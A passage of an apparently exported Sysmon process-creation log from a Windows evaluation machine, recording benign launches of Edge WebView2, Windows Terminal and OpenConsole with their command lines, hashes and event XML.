ParentUser: WINDEV2309EVAL\User",Info,msedgewebview2.exe,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61",C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe,{fda94052-b85d-658c-1702-000000000b00},4184,WINDEV2309EVAL\User,{fda94052-43a9-658d-7402-000000000b00},7044,6156,Microsoft Edge WebView2,,,,,"
      ",-,,,,,,2023-12-28T09:45:13.6965254Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:13.692,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:13.6965254Z""/>
      <EventRecordID>9471</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:13.692</Data>
      <Data Name=""ProcessGuid"">{fda94052-43a9-658d-7402-000000000b00}</Data>
      <Data Name=""ProcessId"">6156</Data>
      <Data Name=""Image"">C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe</Data>
      <Data Name=""FileVersion"">120.0.2210.91</Data>
      <Data Name=""Description"">Microsoft Edge WebView2</Data>
      <Data Name=""Product"">Microsoft Edge WebView2</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">msedgewebview2.exe</Data>
      <Data Name=""CommandLine"">""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=4772 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61</Data>
      <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Low</Data>
      <Data Name=""Hashes"">MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b85d-658c-1702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">4184</Data>
      <Data Name=""ParentImage"">C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.692

ProcessGuid: {fda94052-43a9-658d-7402-000000000b00}

ProcessId: 6156

Image: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

FileVersion: 120.0.2210.91

Description: Microsoft Edge WebView2

Product: Microsoft Edge WebView2

Company: Microsoft Corporation

OriginalFileName: msedgewebview2.exe

CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=4772 --field-trial-handle=1784,i,2295490780030403019,2821906385101450000,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend --variations-seed-version /prefetch:8 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Low

Hashes: MD5=8094151812FF45079C840986A0489C78,SHA256=6A4E8A5761C51840CE988C9241B514028A5E45FDB386B072DB0447E3961E3A06,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63

ParentProcessGuid: {fda94052-b85d-658c-1702-000000000b00}

ParentProcessId: 4184

ParentImage: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe

ParentCommandLine: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\120.0.2210.91\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=421.20070.1820.0 --user-data-dir=""C:\Users\User\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=8112.2288.17893317180732402091 /pfhostedapp:017373b2a5c4ead1a08d36a47bf86195c1909a61

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9470,,-,"MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.597

ProcessGuid: {fda94052-43a9-658d-7302-000000000b00}

ProcessId: 4524

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,{fda94052-43a9-658d-7302-000000000b00},7044,4524,-,,,,,"
      ",-,,,,,,2023-12-28T09:45:13.5986307Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:13.597,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:13.5986307Z""/>
      <EventRecordID>9470</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:13.597</Data>
      <Data Name=""ProcessGuid"">{fda94052-43a9-658d-7302-000000000b00}</Data>
      <Data Name=""ProcessId"">4524</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.597

ProcessGuid: {fda94052-43a9-658d-7302-000000000b00}

ProcessId: 4524

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9469,,-,"MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.524

ProcessGuid: {fda94052-43a9-658d-7202-000000000b00}

ProcessId: 11152

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,{fda94052-43a9-658d-7202-000000000b00},7044,11152,-,,,,,"
      ",-,,,,,,2023-12-28T09:45:13.5260641Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:45:13.524,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:45:13.5260641Z""/>
      <EventRecordID>9469</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:45:13.524</Data>
      <Data Name=""ProcessGuid"">{fda94052-43a9-658d-7202-000000000b00}</Data>
      <Data Name=""ProcessId"">11152</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:45:13.524

ProcessGuid: {fda94052-43a9-658d-7202-000000000b00}

ProcessId: 11152

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
